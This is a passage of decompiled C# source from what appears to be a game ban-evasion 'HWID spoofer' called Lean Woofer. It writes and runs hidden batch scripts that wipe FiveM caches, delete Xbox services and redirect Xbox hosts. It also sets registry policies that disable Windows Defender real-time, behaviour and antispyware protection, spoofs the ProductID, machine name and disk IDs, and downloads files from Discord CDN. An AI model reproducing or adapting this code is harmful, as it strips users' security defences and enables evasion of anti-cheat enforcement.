				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
				streamWriter.WriteLine(":folderclean");
				streamWriter.WriteLine("call :getDiscordVersion");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("goto :xboxclean");
				streamWriter.WriteLine(": getDiscordVersion");
				streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
				streamWriter.WriteLine("     set 'varLoc =%%a'");
				streamWriter.WriteLine("   goto :d1");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine(":d1");
				streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
				streamWriter.WriteLine("     set 'discordVersion =%%z'");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("goto :EOF");
				streamWriter.WriteLine(": xboxclean");
				streamWriter.WriteLine(" cls");
				streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
				streamWriter.WriteLine("sc stop XblAuthManager");
				streamWriter.WriteLine("sc stop XblGameSave");
				streamWriter.WriteLine("sc stop XboxNetApiSvc");
				streamWriter.WriteLine("sc stop XboxGipSvc");
				streamWriter.WriteLine("sc delete XblAuthManager");
				streamWriter.WriteLine("sc delete XblGameSave");
				streamWriter.WriteLine("sc delete XboxNetApiSvc");
				streamWriter.WriteLine("sc delete XboxGipSvc");
				streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
				streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
				streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
				streamWriter.WriteLine("exit");
				streamWriter.WriteLine("goto :eof");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", writable: true).DeleteValue("Append Completion", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", writable: true).DeleteValue("AutoSuggest", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", writable: true).DeleteValue("EnableAutoTray", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", throwOnMissingSubKey: false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", throwOnMissingSubKey: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("AutoEndTasks", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("HungAppTimeout", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("WaitToKillAppTimeout", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("LowLevelHooksTimeout", throwOnMissingValue: false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoLowDiskSpaceChecks", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("LinkResolveIgnoreLinkInfo", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoResolveSearch", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoResolveTrack", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoInternetOpenWith", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("GPU Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("Scheduling Category", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("SFIO Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("GPU Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("Scheduling Category", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("SFIO Priority", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", throwOnMissingSubKey: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text2 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text2))
				{
					streamWriter2.WriteLine("netsh int ip reset");
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text2;
				this.m_d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process2.Start();
			}
			HWIDclick();
			XBOXclick();
			PCclick();
			Diskclick();
			FiveM();
			bi();
			Thread.Sleep(2000);
			string path2 = "C:\\Program Files\\Sounds";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav"))
			{
				new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
			}
			else
			{
				string address = "https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav";
				string fileName = "C:\\Program Files\\Sounds\\fivemspoofed.wav";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
				new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
			}
			MessageBox.Show("Spoofed FiveM, Use new rockstar,steam,discord and restart your pc!", "Lean Woofer - Fast CFX v2", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			File.Delete("C:\\Program Files\\Sounds\\fivemspoofed.wav");
		}

		public static void ClickUnban()
		{
			List<Process> list = new List<Process>();
			d d = new d();
			d.b();
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			HWIDclick();
			XBOXclick();
			PCclick();
			Diskclick();
			FiveM();
			bi();
		}

		public static string GenID(int length)
		{
			string element = "123457869";
			return new string((from a in Enumerable.Repeat(element, length)
				select a[random.Next(a.Length)]).ToArray());
		}

		public static string DiskGen(int length)
		{
			string element = "12345786789";
			return new string((from a in Enumerable.Repeat(element, length)
				select a[random.Next(a.Length)]).ToArray());
		}

		private void bl(object sender, EventArgs e)
		{
			this.m_ba.BringToFront();
		}

		private void bm(object sender, EventArgs e)
		{
		}

		private void bn(object sender, EventArgs e)
		{
			d d = new d();
			d.b();
			HWIDclick();
			string value = "4C713" + "-" + "6585E" + "-" + "38DAF" + "-" + "F8909";
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			InstallDate();
			Disk();
			HWIDclick();
			XBOXclick();
			PCclick();
			Diskclick();
			bi();
			SetMachineName("7932C1");
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				this.m_d.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text2 = this.m_bm.Text;
			string path2 = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine("Volumeid.exe " + text2 + ": " + "8668" + "-" + "1782" + " -nobanner");
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.m_d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path2);
			}
			else
			{
				byte[] bytes = File.ReadAllBytes("558460");
				File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes);
				File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
				Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
				Thread.Sleep(500);
				string text4 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine("Volumeid.exe " + text2 + ": " + "4779" + "-" + "6527" + " -nobanner");
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.m_d.Add(process3);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process3.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path2);
			}
			MessageBox.Show("Spoofed All System", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void bo(object sender, EventArgs e)
		{
			d d = new d();
			d.b();
			if (File.Exists("C:\\Windows\\System32\\nvml.dll"))
			{
				try
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				catch
				{
				}
			}
			MessageBox.Show("Cleaned Nvidia Logger!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void bp(object sender, EventArgs e)
		{
			FiveM();
			ClickUnban();
			MessageBox.Show("Spoofed G-Life Identifiers, Flash your bios and use vpn!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void bq(object sender, EventArgs e)
		{
			try
			{
				string path = "C:\\Program Files\\Saved\\imgsave.gif";
				if (File.Exists(path))
				{
					File.Delete(path);
				}
				Thread.Sleep(1000);
				string path2 = "C:\\Program Files\\Saved";
				if (!Directory.Exists(path2))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path2);
					directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
				}
				else
				{
					Directory.CreateDirectory("C:\\Program Files\\Saved");
					DirectoryInfo directoryInfo2 = Directory.CreateDirectory(path2);
					directoryInfo2.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
				}
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.m_s.Image = new Bitmap(openFileDialog.FileName);
					File.Copy(openFileDialog.FileName, "C:\\Program Files\\Saved\\imgsave.gif");
				}
			}
			catch
			{
				MessageBox.Show("There was an error, try again later!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}

		private void br(object sender, EventArgs e)
		{
			string path = "C:\\Program Files\\Pictures";
			try
			{
				string text = "https://cdn.discordapp.com/attachments/954439038109102182/968512955140431912/lean_animated_logo.gif";
				string text2 = "C:\\Program Files\\Pictures\\leanlogo.gif";
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
				if (File.Exists(text2))
				{
					this.m_s.Image = new Bitmap(text2);
				}
				else
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile(text, text2);
					this.m_s.Image = new Bitmap(text);
				}
				string path2 = "C:\\Program Files\\Pictures\\imgsave.gif";
				File.Delete(path2);
				Thread.Sleep(50);
				this.m_s.Image = new Bitmap(text2);
				Thread.Sleep(2000);
